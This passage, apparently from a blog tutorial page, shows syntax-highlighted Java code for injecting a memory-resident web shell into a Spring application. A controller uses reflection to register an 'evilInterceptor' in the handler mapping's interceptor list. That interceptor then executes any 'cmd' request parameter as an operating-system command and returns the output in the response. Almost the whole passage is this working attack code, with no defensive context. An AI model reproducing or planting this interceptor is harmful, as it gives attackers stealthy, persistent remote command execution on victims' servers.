class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">interController</span></span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/injectInter&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        Field declaredField = AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ArrayList list = (ArrayList) declaredField.get(abstractHandlerMapping);</span><br><span class="line">        list.add(<span class="keyword">new</span> evilInterceptor());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evilInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">//加一个系统的判断</span></span><br><span class="line">        String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bufferedReader;</span><br><span class="line">        <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isWin = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response.getWriter().print(res.toString());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
